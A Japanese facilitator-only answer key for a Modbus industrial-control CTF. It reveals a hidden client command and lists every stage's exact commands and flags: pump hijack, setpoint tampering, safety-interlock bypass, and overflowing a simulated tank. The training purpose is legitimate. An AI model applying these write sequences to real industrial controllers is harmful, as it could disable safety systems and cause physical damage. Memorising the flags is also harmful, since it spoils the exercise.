# 司会専用: Wireshark 無しで解くための裏口まとめ

**参加者には配らない。** Wireshark が入っていない／苦手な参加者に、司会がマンツーマンで提示する用。

本筋では「フラグ文字列は Wireshark でパケットのバイト列から読む」設計。だが配布ツール
`mbclient.py` には**非公開のフォールバック `ascii` コマンド**を残してある（ドキュメント・ヒント
には載せていない。`--help` にコマンド名だけは出るが説明なし）。これを使えば**全フラグを
Wireshark 無しで読める**。

- `ascii <開始番号> <個数>` … そのレジスタ範囲を文字列として表示する（非公開）。
- 以下すべて `python3 mbclient.py --host <IP> --port <PORT> ...` の省略形で記載。

## 裏口が要るのはどれか
- **段位1（偵察）**: 不要。答えは水位レジスタの**番号 10**（`FLAG{10}`）。read-hr で動く番号を見つけるだけ。
- **段位2（盗聴）**: 本来 Wireshark。**裏口あり**（下記）。
- **段位3〜6・ボーナス**: 攻撃手順そのものは Wireshark 不要。ただし**出たフラグを読む**のに本筋では
  Wireshark を使う → ここが**裏口 `ascii` で代替**できる。

## 各問の裏口（攻撃＋ascii読み出し）

| 問題 | 攻撃コマンド | フラグ読み出し（裏口） | フラグ |
|------|-------------|----------------------|--------|
| 2 盗聴 | （なし・読むだけ） | `ascii 40 10` | `FLAG{plaintext}` |
| 3 ポンプ奪取 | `write-co 5 1` | `ascii 100 20` | `FLAG{pump_is_mine_coil_write}` |
| 4 設定改ざん | `write-hr 11 65535` | `ascii 120 20` | `FLAG{setpoint_tamper_no_stop}` |
| 5 安全無効化 | `write-co 6 0` | `ascii 140 20` | `FLAG{safety_interlock_bypassed}` |
| 6 溢水（目的達成） | `write-co 6 0` → `write-hr 11 65535` → `write-co 5 1`（水位が100%になるまで待つ） | `ascii 160 30` | `FLAG{OVERFLOW__you_flooded_the_tank}` |
| B ボーナス | `ascii 70 12`（手がかり「WRITE 4919 TO REG51」）→ `write-hr 51 4919` | `ascii 200 20` | `FLAG{hidden_maintenance_backdoor}` |

## そのまま打てる例（port 5020 の場合）
```bash
PY=python3; T="--host 127.0.0.1 --port 5020"
# 段位1（番号10が答え。裏口不要）
$PY mbclient.py $T read-hr 0 30        # 動く番号＝水位＝10

# 段位2（盗聴の裏口）
$PY mbclient.py $T ascii 40 10         # FLAG{plaintext}

# 段位3 ポンプ奪取
$PY mbclient.py $T write-co 5 1
$PY mbclient.py $T ascii 100 20        # FLAG{pump_is_mine_coil_write}

# 段位4 設定改ざん
$PY mbclient.py $T write-hr 11 65535
$PY mbclient.py $T ascii 120 20        # FLAG{setpoint_tamper_no_stop}

# 段位5 安全無効化
$PY mbclient.py $T write-co 6 0
$PY mbclient.py $T ascii 140 20        # FLAG{safety_interlock_bypassed}

# 段位6 溢水（上の3つを入れた状態で水位100%まで待つ→読む）
$PY mbclient.py $T write-co 6 0; $PY mbclient.py $T write-hr 11 65535; $PY mbclient.py $T write-co 5 1
$PY mbclient.py $T ascii 160 30        # FLAG{OVERFLOW__you_flooded_the_tank}

# ボーナス 保守バックドア
$PY mbclient.py $T ascii 70 12         # 手がかり: WRITE 4919 TO REG51
$PY mbclient.py $T write-hr 51 4919
$PY mbclient.py $T ascii 200 20        # FLAG{hidden_maintenance_backdoor}
```

## 隠しメモリマップ（司会用・参考）
- 水位=10 / 停止SP=11 / 起動SP=12 / HH=13 / 給水=14 / 排水=15
- コイル: ポンプ=5 / 安全IL=6 / 溢水アラーム=7
- 偵察フラグ=40番台 / 手がかり=70番台 / 魔法値書込=51(=4919) / 各達成フラグ=100・120・140・160・200番台
- （出典: `ctf/target.py`）
